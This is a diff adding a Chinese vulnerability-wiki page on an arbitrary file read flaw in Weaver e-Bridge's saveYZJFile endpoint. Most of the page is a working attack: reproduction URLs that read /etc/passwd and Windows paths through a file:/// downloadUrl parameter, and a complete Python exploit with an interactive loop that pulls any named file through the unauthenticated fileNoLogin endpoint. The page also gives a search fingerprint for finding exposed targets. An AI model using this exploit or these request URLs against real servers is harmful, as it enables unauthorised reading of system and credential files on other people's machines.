@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA%20E-Bridge%20saveYZJFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>泛微OA E-Bridge saveYZJFile 任意文件读取漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6cdb\u5faeOA E-Bridge saveYZJFile \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20E-Cology%20BshServlet%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20E-Cology%20BshServlet%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/" class="btn btn-xs btn-link">
+        泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20DBconfigReader.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B3%9B%E5%BE%AEOA%20DBconfigReader.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微OA DBconfigReader.jsp 数据库配置信息泄漏漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="oa-e-bridge-saveyzjfile">泛微OA E-Bridge saveYZJFile 任意文件读取漏洞<a class="headerlink" href="#oa-e-bridge-saveyzjfile" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>泛微云桥 e-Bridge 2018-2019 多个版本
+</code></pre></div>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>title=&quot;泛微云桥e-Bridge&quot;
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>分为两种，分别为 Windows 和 Linux</p>
+<h3 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h3>
+<p>访问 <a href="http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/&amp;fileExt=txt"><strong>http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/&amp;fileExt=txt</strong></a></p>
+<p><img alt="image-20220209104944042" src="../images/202202091049126.png" /></p>
+<p>成功返回 <strong>id值</strong>,说明含有此漏洞</p>
+<p>调用查看文件接口访问 <strong><a href="http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值">http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值</a></strong></p>
+<p><img alt="image-20220209104956250" src="../images/202202091049307.png" /></p>
+<h3 id="linux">Linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h3>
+<p>访问 <a href="http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt"><strong>http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt</strong></a></p>
+<p><img alt="image-20220209105016727" src="../images/202202091050824.png" /></p>
+<p>成功返回 <strong>id值</strong>,说明含有此漏洞</p>
+<p>调用查看文件接口访问 <strong><a href="http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值">http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值</a></strong></p>
+<p><img alt="image-20220209105027907" src="../images/202202091050974.png" /></p>
+<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p>注意读取Linux系统文件时，需要完整路径</p>
+<p>例如读取根目录下的 1.txt</p>
+<p>应为 /1.txt 而不是 1.txt</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
+<span class="c1">#-*- coding:utf-8 -*-</span>
+<span class="c1"># author : PeiQi</span>
+<span class="c1"># from   : http://wiki.peiqi.tech</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">title</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mPOC_Des: http://wiki.peiqi.tech                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mGithub : https://github.com/PeiQi0                                 </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34m公众号 : PeiQi文库                                                         </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mVersion: 泛微云桥 e-Bridge                                          </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36m使用格式:  python3 poc.py                                            </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+
+<span class="c1"># 判断操作系统 or 判断漏洞是否可利用</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+    <span class="n">vuln_url_1</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/&amp;fileExt=txt&quot;</span>
+    <span class="n">vuln_url_2</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt&quot;</span>
+    <span class="n">vuln_url_3</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///&amp;fileExt=txt&quot;</span>
+
+
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span>
+    <span class="p">}</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response_1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url_1</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+        <span class="n">response_2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url_2</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+        <span class="n">response_3</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url_3</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s2">&quot;无法验证您的身份&quot;</span> <span class="ow">in</span> <span class="n">response_1</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="s2">&quot;无法验证您的身份&quot;</span> <span class="ow">in</span> <span class="n">response_2</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 漏洞已修复，不存在漏洞 </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">if</span> <span class="s2">&quot;No such file or directory&quot;</span> <span class="ow">in</span> <span class="n">response_1</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m[o] 目标为 Linux 系统</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+                <span class="nb">id</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&quot;id&quot;:&quot;(.*?)&quot;&#39;</span><span class="p">,</span> <span class="n">response_3</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m[o] 成功获取id：</span><span class="si">{}</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+                <span class="k">return</span> <span class="nb">id</span><span class="p">,</span><span class="s2">&quot;linux&quot;</span>
+            <span class="k">elif</span> <span class="s2">&quot;系统找不到指定的路径&quot;</span> <span class="ow">in</span> <span class="n">response_2</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m[o] 目标为 Windows 系统</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+                <span class="nb">id</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&quot;id&quot;:&quot;(.*?)&quot;&#39;</span><span class="p">,</span> <span class="n">response_1</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m[o] 成功获取id：</span><span class="si">{}</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+                <span class="k">return</span> <span class="nb">id</span><span class="p">,</span><span class="s2">&quot;windows&quot;</span>
+
+            <span class="k">else</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 无法获取目标系统</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># 验证漏洞</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="nb">id</span><span class="p">):</span>
+    <span class="n">file_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/file/fileNoLogin/</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span>
+    <span class="p">}</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">file_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+        <span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;GBK&#39;</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m[o] 成功读取：</span><span class="se">\n\033</span><span class="s2">[0m</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">))</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># windows 文件读取</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">POC_3</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">File</span><span class="p">):</span>
+    <span class="n">file_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/</span><span class="si">{}</span><span class="s2">&amp;fileExt=txt&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">File</span><span class="p">)</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span>
+    <span class="p">}</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">file_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+        <span class="nb">id</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&quot;id&quot;:&quot;(.*?)&quot;&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m[o] 成功获取id：</span><span class="si">{}</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+        <span class="n">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="nb">id</span><span class="p">)</span>
+    <span class="k">except</span> <span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败，无法读取文件 </span><span class="se">\033</span><span class="s2">[0m)&quot;</span><span class="p">)</span>
+
+<span class="c1"># linux读取文件</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">POC_4</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">File</span><span class="p">):</span>
+    <span class="n">file_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file://</span><span class="si">{}</span><span class="s2">&amp;fileExt=txt&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">File</span><span class="p">)</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span>
+    <span class="p">}</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">file_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+        <span class="nb">id</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&quot;id&quot;:&quot;(.*?)&quot;&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m[o] 成功获取id：</span><span class="si">{}</span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+        <span class="n">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="nb">id</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败，无法读取文件 </span><span class="se">\033</span><span class="s2">[0m)&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">title</span><span class="p">()</span>
+    <span class="n">target_url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[35mPlease input Attack Url</span><span class="se">\n</span><span class="s2">Url   &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">))</span>
+    <span class="nb">id</span><span class="p">,</span><span class="n">system</span> <span class="o">=</span> <span class="n">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
+    <span class="n">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="nb">id</span><span class="p">)</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">system</span> <span class="o">==</span> <span class="s2">&quot;windows&quot;</span><span class="p">:</span>
+            <span class="n">File</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[35mFile &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">File</span> <span class="o">==</span> <span class="s2">&quot;exit&quot;</span><span class="p">:</span>
+                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">POC_3</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">File</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">system</span> <span class="o">==</span> <span class="s2">&quot;linux&quot;</span><span class="p">:</span>
+            <span class="n">File</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[35mFile &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">File</span> <span class="o">==</span> <span class="s2">&quot;exit&quot;</span><span class="p">:</span>
+                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">POC_4</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">File</span><span class="p">)</span>
+</code></pre></div>
+<p><img alt="image-20220209105047595" src="../images/202202091050654.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20E-Cology%20BshServlet%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20E-Cology%20BshServlet%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/" class="btn btn-xs btn-link">
+        泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20DBconfigReader.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B3%9B%E5%BE%AEOA%20DBconfigReader.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微OA DBconfigReader.jsp 数据库配置信息泄漏漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
